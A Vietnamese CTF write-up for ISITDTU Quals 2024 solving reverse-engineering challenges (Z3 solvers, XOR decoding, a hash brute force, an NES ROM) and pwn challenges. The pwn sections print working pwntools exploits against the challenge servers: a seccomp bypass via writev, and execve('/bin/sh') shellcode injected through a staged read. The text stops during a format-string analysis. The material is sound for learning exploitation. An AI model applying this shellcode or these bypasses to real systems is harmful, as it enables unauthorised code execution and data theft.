<style>
img {
    box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
    border-radius: 6px;
    display: block; 
    margin-left: auto; 
    margin-right: auto;
}
</style>

# ISITDTU Quals 2024

<img src="0.png"/>

## rev/animal

{{< admonition note "Challenge Information" >}}
* 31 solves / 100 pts / by kinjazz
* **Given files:** [animal.7z](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EVuJORIn52pClGE2rCr4DmUBCTw90S1TIg4_IAXLm0DzQg?e=qSdvbh)
* **Description:** Find the hidden animal
{{< /admonition >}}

**Solution**

Đề bài cho chúng ta một file PE64. Mở bằng IDA64, tổng quan chương trình sẽ như sau

<img src="1.png"/>

Chương trình yêu cầu nhập flag có độ dài 36 ký tự, trong đó có điều kiện check ở một số idex cụ thể.

Khi click vào hàm `check_flag`, ta nhận được thông báo lỗi như sau 

<img src="2.png" width=500em/>

Qua tab IDA View chế độ non-graph, ta thấy đây chỉ là một lệnh gọi hàm bình thường

<img src="3.png"/>

Vậy mình sẽ debug từng dòng và sửa các kết quả check để chương trình tới được đến đoạn này. Đây là chương trình khi mình nhảy vào `rax`

<img src="4.png"/>

Ấn phím `p` để create function và thu được đống mã giả của hàm này như sau 

```c
_BOOL8 __fastcall sub_21871F785(char *a1)
{
    [...]

  v2 = a1[27];
  v3 = a1[1];
  v4 = a1[32];
  v5 = a1[8];
  v6 = a1[29];
  if ( v5 * v3 + v4 * v2 * a1[25] - v6 != 538738 )
    return 0i64;
  v7 = a1[4];
  v8 = a1[10];
  v9 = a1[20];
  if ( a1[7] + v9 * v8 * v7 - a1[6] - a1[11] != 665370 )
    return 0i64;
  v10 = a1[30];
  if ( a1[14] + (a1[16] - 1) * a1[31] - v10 * a1[22] != -2945 )
    return 0i64;
  v11 = a1[18];
  v12 = a1[33];
  if ( v12 + a1[3] - a1[9] - v11 - a1[11] - v7 != -191 )
    return 0i64;
  if ( v3 + v10 + v11 + a1[25] * v6 - v5 != 4853 )
    return 0i64;
  v13 = a1[7];
  v14 = a1[13];
  if ( v14 + a1[5] - v13 * a1[14] * a1[23] * a1[2] != -86153321 )
    return 0i64;
  v15 = a1[9];
  if ( v14 + v15 * a1[5] * a1[12] + v2 * v8 != 873682 )
    return 0i64;
  v16 = v15 * a1[21];
  v17 = a1[6];
  v18 = v11 * v16;
  v19 = a1[22];
  if ( v19 + a1[3] + v18 - v17 != 451644 )
    return 0i64;
  v20 = a1[24];
  if ( a1[21] + a1[34] + v20 + v4 * a1[23] - v7 != 9350 )
    return 0i64;
  v21 = a1[17];
  v22 = a1[19];
  v29 = a1[35];
  v28 = a1[26];
  if ( v20 + v29 + a1[17] - v22 - v28 - v17 != 27 )
    return 0i64;
  v23 = a1[15];
  if ( a1[14] + a1[13] + v23 + a1[23] * v22 - a1[3] == 11247
    && (v24 = v13 * a1[12], v25 = a1[2], v25 + v21 + v24 - v23 - a1[21] == 13297)
    && (v26 = *a1, v5 + v29 + v28 + a1[28] - v26 - v9 == 266)
    && v25 + v21 + v26 + a1[12] * a1[28] - v3 == 10422
    && v19 + v23 + a1[5] * v22 - a1[34] - a1[11] == 9883 )
  {
    return v8 * v12 + a1[16] * (1 - v9) - v26 == -5604;
  }
  else
  {
    return 0i64;
  }
}
```

Tới đây chúng ta sẽ biết được luôn phải dùng Z3 để tìm ra flag. Lời giải của mình như sau 

```python
from z3 import *

solver = Solver()

flag = [Int(f'flag[{i}]') for i in range(36)]

for i in range(36):
    solver.add(flag[i] >= 0, flag[i] <= 128)

solver.add(flag[0] == ord('I'))
solver.add(flag[1] == ord('S'))
solver.add(flag[2] == ord('I'))
solver.add(flag[3] == ord('T'))
solver.add(flag[4] == ord('D'))
solver.add(flag[5] == ord('T'))
solver.add(flag[6] == ord('U'))
solver.add(flag[7] == ord('{'))
solver.add(flag[8] == 0x61)
solver.add(flag[17] == 0x63)
solver.add(flag[18] == 0x61)
solver.add(flag[19] == 0x74)
solver.add(flag[33] == flag[34])
solver.add(flag[35] == ord('}'))

solver.add(flag[22] + flag[3] + flag[18] * flag[9] * flag[21] - flag[6] == 451644)
solver.add(flag[24] + flag[35] + flag[17] - flag[19] - flag[26] - flag[6] == 27)
solver.add(flag[8] * flag[1] + flag[32] * flag[27] * flag[25] - flag[29] == 0x83872)
solver.add(flag[7] + flag[20] * flag[10] * flag[4] - flag[6] - flag[11] == 665370)
solver.add(flag[14] + (flag[16] - 1) * flag[31] - flag[30] * flag[22] == -2945)
solver.add(flag[33] + flag[3] - flag[9] - flag[18] - flag[11] - flag[4] == -191)
solver.add(flag[1] + flag[30] + flag[18] + flag[25] * flag[29] - flag[8] == 4853)
solver.add(flag[13] + flag[5] - flag[7] * flag[14] * flag[23] * flag[2] == -86153321)
solver.add(flag[13] + flag[9] * flag[5] * flag[12] + flag[27] * flag[10] == 873682)
solver.add(flag[21] + flag[34] + flag[24] + flag[32] * flag[23] - flag[4] == 9350)
solver.add(flag[14] + flag[13] + flag[15] + flag[23] * flag[19] - flag[3] == 11247)
solver.add(flag[2] + flag[17] + flag[7] * flag[12] - flag[15] - flag[21] == 13297)
solver.add(flag[8] + flag[35] + flag[26] + flag[28] - flag[0] - flag[20] == 266)
solver.add(flag[2] + flag[17] + flag[0] + flag[12] * flag[28] - flag[1] == 10422)
solver.add(flag[22] + flag[15] + flag[5] * flag[19] - flag[34] - flag[11] == 9883)
solver.add(flag[10] * flag[33] + flag[16] * (1 - flag[20]) - flag[0] == -5604)

if solver.check() == sat:
    model = solver.model()
    print(model)
else:
    print("0xDEADBEEF")

flag[0] = 73
flag[1] = 83
flag[2] = 73
flag[3] = 84
flag[4] = 68
flag[5] = 84
flag[6] = 85
flag[7] = 123
flag[8] = 97
flag[17] = 99
flag[18] = 97
flag[19] = 116
flag[35] = 125
flag[33] = 33
flag[13] = 100
flag[12] = 108
flag[26] = 117
flag[22] = 110
flag[21] = 49
flag[20] = 95
flag[27] = 114
flag[23] = 95
flag[29] = 97
flag[10] = 103
flag[11] = 48
flag[32] = 97
flag[15] = 110
flag[31] = 101
flag[16] = 95
flag[30] = 114
flag[9] = 95
flag[14] = 101
flag[28] = 95
flag[25] = 48
flag[34] = 33
flag[24] = 121

print("".join([chr(i) for i in flag]))
```

Flag thu được là `ISITDTU{a_g0lden_cat_1n_y0ur_area!!}`

## rev/re01

{{< admonition note "Challenge Information" >}}
* 46 solves / 100 pts
* **Given files:** [re01.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/ESNNoaYOae9JvGrl9JN6OPMBtIU2akWobbFQ_uM4AorvGg?e=6Qz8eW)
* **Description:** VC++ ;)
{{< /admonition >}}

**Solution**

Đề bài cho chúng ta một file PE64, mở bằng IDA64, quan sát tổng thể ta có thể thấy chương trình dùng SHA1 để hash input và so sánh với chuỗi hash `eeeddf4ae0c3364f189a37f79c9d7223a1d60ac7`

<img src="5.png"/>

Sau một hồi thử crack chuỗi hash kia không được, mình tiếp tục đi xem có function nào đáng nghi không. Và đây chính là hàm mà mình chú ý tới `TlsCallback_0`

<img src="6.png"/>

Chương trình sử dụng anti-debug và gọi nó trong hàm TLS. Mình đặt breakpoint ở đoạn check `IsDebuggerPresent` và sửa giá trị cho `ZF` để chương trình tiếp tục được đi vào trong hàm `sub_140004000`

<img src="7.png"/>

Chúng ta dễ dàng nhận ra input length = 58. Mình sẽ tạo mới input và debug lại. Kiểm tra các giá trị ở đoạn so sánh, ta biết được điều kiện check flag sẽ là

```python
flag[i] ^ 0x35 == v7[i] 
```

Dễ dàng lấy toàn bộ giá trị của `v7` và xor ngược lại, ta thu được flag `ISITDTU{Congrats_You_Solved_TLS_Callback_Re01_Have_Fun_:)}`

```python
X = [0x7C, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x7C, 0x00, 
    0x00, 0x00, 0x61, 0x00, 0x00, 0x00, 0x71, 0x00, 0x00, 0x00, 
    0x61, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x4E, 0x00, 
    0x00, 0x00, 0x76, 0x00, 0x00, 0x00, 0x5A, 0x00, 0x00, 0x00, 
    0x5B, 0x00, 0x00, 0x00, 0x52, 0x00, 0x00, 0x00, 0x47, 0x00, 
    0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00, 
    0x46, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0x6C, 0x00, 
    0x00, 0x00, 0x5A, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 
    0x6A, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0x5A, 0x00, 
    0x00, 0x00, 0x59, 0x00, 0x00, 0x00, 0x43, 0x00, 0x00, 0x00, 
    0x50, 0x00, 0x00, 0x00, 0x51, 0x00, 0x00, 0x00, 0x6A, 0x00, 
    0x00, 0x00, 0x61, 0x00, 0x00, 0x00, 0x79, 0x00, 0x00, 0x00, 
    0x66, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 0x76, 0x00, 
    0x00, 0x00, 0x54, 0x00, 0x00, 0x00, 0x59, 0x00, 0x00, 0x00, 
    0x59, 0x00, 0x00, 0x00, 0x57, 0x00, 0x00, 0x00, 0x54, 0x00, 
    0x00, 0x00, 0x56, 0x00, 0x00, 0x00, 0x5E, 0x00, 0x00, 0x00, 
    0x6A, 0x00, 0x00, 0x00, 0x67, 0x00, 0x00, 0x00, 0x50, 0x00, 
    0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
    0x6A, 0x00, 0x00, 0x00, 0x7D, 0x00, 0x00, 0x00, 0x54, 0x00, 
    0x00, 0x00, 0x43, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00, 
    0x6A, 0x00, 0x00, 0x00, 0x73, 0x00, 0x00, 0x00, 0x40, 0x00, 
    0x00, 0x00, 0x5B, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x00, 0x00, 
    0x0F, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x48, 0x00, 
    0x00, 0x00]

flag = "".join([chr(0x35 ^ int.from_bytes(X[i:i+4], "little")) for i in range(0, len(X), 4)])
print(flag)
```

## rev/re02

{{< admonition note "Challenge Information" >}}
* 29 solves / 100 pts
* **Given files:** [re02.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EeUsnHq698FEtmb_PBqHVr0B8lbnkxPoWVzGVXMzEv56Tg?e=Yzivqm)
* **Description:** NES, good luck ;)
{{< /admonition >}}

**Solution**

Đề bài cho chúng ta một file `re02.nes`, đây là một Nintendo ROM image file. Sau một hồi tìm kiếm, mình tìm được tool `FCEUX` có thể emulate và debug file này.  

Mở chương trình lên thì thấy một màn hình đen kịt 

<img src="8.png"/>

Vào tab Debug → Hex Editor thấy 3 byte đầu nhảy liên tục, chứng tỏ rằng chương trình vẫn đang hoạt động bình thường. 

<img src="9.png"/>

Sau khi thử nhập một vài phím và check toàn bộ dữ liệu trong tab Hex Editor, mình phát hiện input được xuất hiện ở các địa chỉ: 

- 0x0300
- 0x0B00
- 0x1300
- 0x1B00

<img src="10.png"/>

và có một số đặc điểm như sau: 

- Độ dài tối đa input là 16
- Có 7 phím được chấp nhận và nó sẽ được map như sau:
    - `s` → `a`
    - `d` → `u`
    - `f` → `t`
    - `up arrow` → `n`
    - `right arrow` → `i`
    - `down arrow` → `h`
    - `left arrow` → `l`

Sau khi đã biết chỗ nhập input thì chỗ check flag sẽ nằm ở đâu? 

Mình vào tab Debug → Debugger, tìm đoạn code nào có chứa `300` (địa chỉ input) hoặc lệnh `cmp` thì ra được đoạn này 

<img src="11.png"/>

Nếu tinh ý, ta có thể nhận ra các block check input khá tương tự nhau. Lấy các giá trị ở địa chỉ 300, 301 và 302 cộng với nhau, sau đó so sánh với 0x4A. Ví dụ cho block check đầu tiên sẽ là 

```python
input[0] + input[1] + input[2] == 0x4A
```

Thực hiện tương tự cho các block sau, chúng ta có thể tìm ra được `mapped_input` bằng Z3 

```python
from z3 import * 

solver = Solver()
flag = [BitVec(f'flag[{i}]', 8) for i in range(16)]

for i in range(16):
    solver.add(Or((flag[i] == ord('t')), (flag[i] == ord('u')), (flag[i] == ord('a')), (flag[i] == ord('n')), (flag[i] == ord('l')), (flag[i] == ord('i')), (flag[i] == ord('h'))))

solver.add(flag[0] + flag[1] + flag[2] == 0x4A)
solver.add(flag[1] + flag[2] + flag[3] == 0x44)
solver.add(flag[2] + flag[3] + flag[4] == 0x3B)
solver.add(flag[3] + flag[4] + flag[5] == 0x43)
solver.add(flag[4] + flag[5] + flag[6] == 0x43)
solver.add(flag[5] + flag[6] + flag[7] == 0x3F)
solver.add(flag[6] + flag[7] + flag[8] == 0x42)
solver.add(flag[7] + flag[8] + flag[9] == 0x3D)
solver.add(flag[8] + flag[9] + flag[10] == 0x43)
solver.add(flag[9] + flag[10] + flag[11] == 0x3F)
solver.add(flag[10] + flag[11] + flag[12] == 0x4A)
solver.add(flag[11] + flag[12] + flag[13] == 0x51)
solver.add(flag[12] + flag[13] + flag[14] == 0x4A)
solver.add(flag[13] + flag[14] + flag[15] == 0x44)

if solver.check() == sat:
    model = solver.model()
    res = ""
    for i in range(16):
        res += chr(model[flag[i]].as_long())
    print(res)
else:
    print("......")
```

Kết quả thu được là `tuanlinhlinhtuan`,** bây giờ ta chỉ cần nhập input đúng với các key đã được map sẽ có được flag là `ISITDTU{Throw_back_the_nested_if_NES_have_funnnn_:)}`

<img src="12.png" width=500em/>

## rev/The Chamber of Flag

{{< admonition note "Challenge Information" >}}
* 28 solves / 100 pts / by ks75vl
* **Given files:** [TheChamberOfFlag_11BA527D91D85F332DEBC3145E3E1C4A.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EfFkS6k8M_9JjPsrzbBDaYkBIuV4cVsOh92XlL1pCCfG6A?e=4BGYmb)
* **Description:** Try to unlock the Chamber and get the Flag.
{{< /admonition >}}

**Solution**

Đề bài cho chúng ta một file PE64, chạy thử chương trình, ta thấy có 2 option để lựa chọn:

- login
    - input secret key
- about

<img src="13.png" width=500em/>

Mình thử nhập secret và nhận thấy:

- Độ dài secret = 6
- Nhập sai sẽ cho nhập tiếp

Mở file bằng IDA64, chương trình nhìn rất lớn và phức tạp. Mình nhảy qua tab string và nhận thấy chương trình có gọi các hàm encrypt của WinAPI. 

<img src="14.png"/>

Trace theo các hàm này, mình tìm ra được hàm `sub_7FF6A0F51530` thực hiện việc mã hóa input và đi kiểm tra tính hợp lệ của nó. 

<img src="15.png"/>

Sau khi debug và decrypt `AlgId`, chúng ta biết được chương trình sử dụng hash SHA256. Thông tin chi tiết các bạn có thể đọc thêm ở đây https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptopenalgorithmprovider

<img src="16.png"/>

Tiếp tục debug và ta lấy được `checked_hash` = `26F2D45844BFDBC8E5A2AE67149AA6C50E897A2A48FBF479D1BFB9F0D4E24544`

Với input có độ dài 6 ký tự, mình sẽ dùng `hashcat` để bruteforce nhằm tìm ra giá trị tương ứng với mã hash này. Kết quả thu được là `808017`

<img src="23.png"/>

Đăng nhập thành công, chúng ta chọn option flag nhưng lại xuất hiện thông báo flag crashed.

<img src="17.png" width=500em/>

Sau khi xref chuỗi trên, mình tìm ra được đoạn code có liên quan tới chuỗi trên ở đây. 

<img src="18.png"/>

Đi phân tích hàm `sub_7FF7AFB110C8`, ta thấy nó decrypt dữ liệu bằng thuật toán AES mode CBC. 

```c
__int64 __fastcall sub_7FF7AFB110C8(PUCHAR pbInput, __int64 a2, __int64 a3, UCHAR *a4, PUCHAR a5)
{
  char v7; // al
  unsigned __int64 v8; // rcx
  unsigned __int64 v9; // rcx
  char v10; // al
  char v11; // bl
  char v12; // al
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // rcx
  unsigned int v15; // ebx
  HANDLE ProcessHeap; // rax
  UCHAR *v17; // rbx
  HANDLE v18; // rax
  WCHAR pszProperty[2]; // [rsp+50h] [rbp-61h] BYREF
  int v21; // [rsp+54h] [rbp-5Dh]
  int v22; // [rsp+58h] [rbp-59h]
  int v23; // [rsp+5Ch] [rbp-55h]
  int v24; // [rsp+60h] [rbp-51h]
  int v25; // [rsp+64h] [rbp-4Dh]
  int v26; // [rsp+68h] [rbp-49h]
  WCHAR pszAlgId[2]; // [rsp+70h] [rbp-41h] BYREF
  int v28; // [rsp+74h] [rbp-3Dh]
  __int16 v29; // [rsp+78h] [rbp-39h]
  char v30; // [rsp+80h] [rbp-31h]
  char v31; // [rsp+81h] [rbp-30h]
  UCHAR pbInputa[4]; // [rsp+82h] [rbp-2Fh] BYREF
  int v33; // [rsp+86h] [rbp-2Bh]
  int v34; // [rsp+8Ah] [rbp-27h]
  int v35; // [rsp+8Eh] [rbp-23h]
  int v36; // [rsp+92h] [rbp-1Fh]
  int v37; // [rsp+96h] [rbp-1Bh]
  int v38; // [rsp+9Ah] [rbp-17h]
  int v39; // [rsp+9Eh] [rbp-13h]
  BCRYPT_ALG_HANDLE phAlgorithm; // [rsp+A8h] [rbp-9h] BYREF
  BCRYPT_KEY_HANDLE phKey; // [rsp+B0h] [rbp-1h] BYREF
  UCHAR pbOutput[4]; // [rsp+B8h] [rbp+7h] BYREF
  ULONG pcbResult; // [rsp+BCh] [rbp+Bh] BYREF
  ULONG v44; // [rsp+C0h] [rbp+Fh] BYREF

  phAlgorithm = 0i64;
  phKey = 0i64;
  *(_DWORD *)pbOutput = 0;
  v7 = 98;
  pcbResult = 0;
  *(_DWORD *)pszAlgId = '#\0b';                 // AES
  v8 = 0i64;
  v28 = 3211303;
  v29 = 0;
  while ( 1 )
  {
    pszAlgId[++v8] ^= v7;
    if ( v8 >= 3 )
      break;
    v7 = pszAlgId[0];
  }
  v29 = 0;
  if ( BCryptOpenAlgorithmProvider(&phAlgorithm, &pszAlgId[1], 0i64, 0) )
    return 0i64;
  v9 = 0i64;
  *(_DWORD *)pbInputa = 6881346;                // ChangingModeCBC
  v10 = 1;
  v31 = 0;
  v30 = 1;
  v33 = 6815840;
  v11 = 111;
  v34 = 6815855;
  v35 = 6684783;
  v36 = 7209036;
  v37 = 6553701;
  v38 = 4390978;
  v39 = 66;
  while ( 1 )
  {
    *(_WORD *)&pbInputa[2 * v9++] ^= v10;
    if ( v9 >= 0xF )
      break;
    v10 = v30;
  }
  HIWORD(v39) = 0;
  v12 = 41;
  *(_DWORD *)pszProperty = 6946857;
  v13 = 0i64;
  v21 = 4718657;
  v22 = 4653120;
  v23 = 4653120;
  v24 = 6553678;
  v25 = 5046342;
  v26 = 76;
  while ( 1 )
  {
    pszProperty[++v13] ^= v12;
    if ( v13 >= 0xC )
      break;
    v12 = pszProperty[0];
  }
  HIWORD(v26) = 0;
  if ( BCryptSetProperty(phAlgorithm, &pszProperty[1], pbInputa, 0x20u, 0) )
    return 0i64;
  *(_DWORD *)pszProperty = 2097263;             // objectLength
  v21 = 327693;
  v14 = 0i64;
  v22 = 786442;
  v23 = 2293787;
  v24 = 65546;
  v25 = 1769480;
  v26 = 7;
  while ( 1 )
  {
    pszProperty[++v14] ^= v11;
    if ( v14 >= 0xC )
      break;
    v11 = pszProperty[0];
  }
  HIWORD(v26) = 0;
  if ( BCryptGetProperty(phAlgorithm, &pszProperty[1], pbOutput, 4u, &pcbResult, 0) )
    return 0i64;
  v15 = *(_DWORD *)pbOutput;
  ProcessHeap = GetProcessHeap();
  v17 = (UCHAR *)HeapAlloc(ProcessHeap, 0, v15);
  if ( !v17 )
    return 0i64;
  if ( BCryptGenerateSymmetricKey(phAlgorithm, &phKey, v17, *(ULONG *)pbOutput, &pbSecret, 0x20u, 0) )
    return 0i64;
  v44 = 16;
  if ( BCryptDecrypt(phKey, pbInput, 0x10u, 0i64, a4, 0x10u, a5, 0x10u, &v44, 0) )
    return 0i64;
  BCryptDestroyKey(phKey);
  BCryptCloseAlgorithmProvider(phAlgorithm, 0);
  v18 = GetProcessHeap();
  HeapFree(v18, 0, v17);
  return 1i64;
}
```

Nhưng khi chạy đến cuối hàm thì gặp lỗi này. 

<img src="19.png"/>

Lỗi này gây ra do `rcx` chưa trỏ đúng vào vị trí bộ nhớ. 

<img src="20.png" width=500em/>

Lúc này, mình tìm xung quanh các thanh ghi `rcx` để xem nó bị ảnh hưởng bởi thanh ghi nào. Ta thấy có `rax` và `rbx` tác động tới nó 

<img src="21.png"/>

 Do `rax` trên stack nên mình bỏ qua, tìm xung quanh giá trị của `rbx`, ta thấy có đống dữ liệu rất khả nghi.

<img src="22.png"/>

Đưa `rcx` trỏ về đây, chạy nốt chương trình và thu được flag `ISITDTU{STATIC_STRUCt_INITIALIZATION_FAiLED}`

## pwn/shellcode 1

{{< admonition note "Challenge Information" >}}
* 68 solves / 100 pts / by code016hiro
* **Given files:** [shellcode1.rar](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/ERrQb5blRN1IgofOJUmPwBwBROdWJxB03jdYp0yTbzcfGg?e=UTPFbg)
* **Description:** `nc 152.69.210.130 3001`
{{< /admonition >}}

**Solution**

Về tổng quan, chương trình đọc flag, lưu nó trên 1 vùng nhớ được `mmap` rồi xóa flag đó đi. Chương trình tiếp tục `mmap` một vùng nhớ mới cho shellcode với full quyền rwx và cho phép chúng ta chạy shellcode đó. 

<img src="25.png"/>

Khi nhảy vào shellcode, check `vmmap`, ta có thể thấy được vùng nhớ lưu flag nằm ngay dưới shellcode và cách nhau 0x1000 byte. Vậy nếu ta sử dụng được syscall `write` thì hoàn toàn có thể đọc được flag. 

<img src="26.png"/>

Kiểm tra seccomp, ta thấy các syscall như `read`, `write`, `open`, `execve`, `openat` đều không được phép sử dụng.

```shell
❯ seccomp-tools dump ./challenge
Some gift for you: 0x7fd1042216f0

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
 0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012
 0009: 0x15 0x02 0x00 0x000000f0  if (A == mq_open) goto 0012
 0010: 0x15 0x01 0x00 0x00000101  if (A == openat) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
 ```

 Để bypass được các hạn chế phía trên, mình sẽ sử dụng syscall `writev` thay thế cho `write` để đọc flag.

 ```c
 ssize_t writev(int fd, const struct iovec *iov, int iovcnt)
 ``` 
 trong đó `iovec` có cấu trúc như sau 
 ```c
 struct iovec {
    void  *iov_base;    /* Starting address */
    size_t iov_len;     /* Number of bytes to transfer */
};
```
Vậy mình sẽ chỉ định cho `iov_base` là địa chỉ vùng nhớ chứa flag, `iov_len` là 0x100. 

Khi nhảy vào shellcode, `rdx` chứa giá trị của địa chỉ shellcode. Vậy nên địa chỉ của vùng nhớ flag sẽ là `rdx + 0x1000`. 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)

# p = process(exe.path)
p = remote("152.69.210.130", 3001)

sl  = p.sendline
sa  = p.sendafter
sla = p.sendlineafter
rl  = p.recvline
ru  = p.recvuntil

ru(b"Some gift for you: ")

libc_leak = int(rl().strip(), 16) 
libc_base = libc_leak - libc.symbols["printf"]
log.info(f"libc leak = {hex(libc_leak)}")

payload = asm("""
    add rdx, 0x1000      
    mov rax, 0x100
    push rax         
    push rdx          
    mov rdi, 1 
    mov rsi, rsp 
    mov rdx, 1                                 
    mov rax, 0x14
    syscall           
""")

p.send(payload)

p.interactive() 
```
Flag là `ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8}`

## pwn/shellcode 2

{{< admonition note "Challenge Information" >}}
* 61 solves / 100 pts / by code016hiro
* **Given files:** [shellcode2.rar](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EX0TUAE1NPhJndbYW1iHfpYBTKYyWKIMhYnFfxp1WSXHFA?e=sBRCLM)
* **Description:** `nc 152.69.210.130 3002`
{{< /admonition >}}

**Solution**

Decompile file đề bài cho bằng IDA64, ta có thể thấy chương trình `mmap` cho vùng nhớ ở địa chỉ 0xAABBCC00 kích thước 0x1000 byte với full quyền rwx. 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  read_flag();
  addr = mmap((void *)0xAABBCC00LL, 0x1000uLL, 7, 34, -1, 0LL);
  if ( addr == (void *)-1LL )
  {
    perror("mmap");
    return 1;
  }
  else
  {
    puts(">");
    read(0, addr, 0x1000uLL);
    for ( i = 0; i <= 4095; ++i )
    {
      if ( (*((_BYTE *)addr + i) & 1) == 0 )
        *((_BYTE *)addr + i) = 0x90;
    }
    ((void (*)(void))addr)();
    return 0;
  }
}
```

Những opcode chẵn trong shellcode sẽ bị thay đổi thành `nop` làm cho nó không hoạt động được.

Có một bài [write-up](https://github.com/peace-ranger/CTF-WriteUps/tree/main/2022/UIUCTF/odd-shell) của giải UIUCTF 2022 nói rất chi tiết về việc build lại toàn bộ các instruction với opcode lẻ cần thiết cho việc lấy shell mà các bạn có thể tham khảo. Mình sẽ giải bài này với hướng tiếp cận khác so với write-up phía trên.  

Chúng ta có thể thấy, khi chương trình chuẩn bị nhảy vào shellcode, các giá trị của các thanh ghi như `rax`, `rdi`, `rsi` và `rdx` đều hợp lệ cho việc gọi syscall `read`.

<img src="24.png"/>

Vậy payload đầu tiên chúng ta chỉ cần gọi `syscall` để chương trình tiếp tục được nhập input lần thứ hai. Vì đã pass qua vòng `for` check opcode chẵn lẻ, nên tại lần nhập thứ hai này, ta chỉ cần viết shellcode lấy shell như thông thường. 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge") 
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.35.so")

context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)

# p = process(exe.path)
p = remote("152.69.210.130", 3002)

sl  = p.sendline
sa  = p.sendafter
sla = p.sendlineafter
rl  = p.recvline
ru  = p.recvuntil

payload1 = asm("""
    syscall 
""")
sa(b">\n", payload1)

payload2 = asm("""
    nop
    nop
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp 
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
""")
p.send(payload2)

p.interactive() 
```

Flag là `ISITDTU{95acf3a6b3e1afc243fbad70fbd60a6be00541c62c6d651d1c10179b41113bda}`

## pwn/Game of Luck

{{< admonition note "Challenge Information" >}}
* 43 solves / 100 pts
* **Given files:** [chal](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/ERNFcvJ6e1hJpa1dCZ_7Vi0BuGrWTSPjcJKarUz4mA63_Q?e=xatAA3)
* **Description:** `nc 152.69.210.130 2004`
{{< /admonition >}}

**Solution** 

### Overview & Find bug

Chương trình chính sau khi được rename lại như sau 
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  init();
  welcome();
  get_random_number();
  game();
}
```

trong đó hàm `game` là hàm xử lý chính 

<img src="./27.png">

Nhìn tổng quan, có 2 lựa chọn cho người chơi: 
1. Lấy giá trị ngẫu nhiên trong khoảng [0, 100] qua hàm `get_random_number`.
2. Chơi game đoán giá trị ngẫu nhiên thông qua hàm `play`.

```c
__int64 play()
{
  unsigned int v0; // eax
  int random_number; // [rsp+8h] [rbp-8h]

  v0 = clock();
  srand(v0);
  random_number = rand();
  printf("Enter your guess: ");
  if ( get_int_number() != random_number )
  {
    puts("Incorrect!");
    exit(0);
  }
  puts("Correct!");
  if ( ++point == 10 )
  {
    enter_name();                               // fmt bug
    exit(0);
  }
  return 0LL;
}
``` 

Ở trong hàm `play` này, ta thấy được có bug Format String ở hàm `enter_name`.
```c
__int64 enter_name()
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Enter your name: ");
  read(0, buf, 216uLL);
  printf(buf, point);
  return 0LL;
}
```

### Exploit 

Chúng ta chỉ có 1 bug duy nhất FSB trong hàm `play`. Mình sẽ tiếp tục tìm kiếm xem có cách nào để tái sử dụng bug này được nhiều lần hay không.

Quay về hàm `game`, đây là đoạn code khiến mình quan tâm nhất.
```c
  unsigned int choice; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  while ( 1 )
  {
    while ( 1 )
    {
      printf("Score: %u points\n", point);
      puts("0. Lucky Number\n1. Play\n2. Exit");
      __isoc99_scanf("%1u", &choice);           // bypass with "-"
      while ( getchar() != 10 )
        ;
      if ( choice != 68 )
        break;
      enter_name();                             // choice = 68
    }
    [...]
  }
```

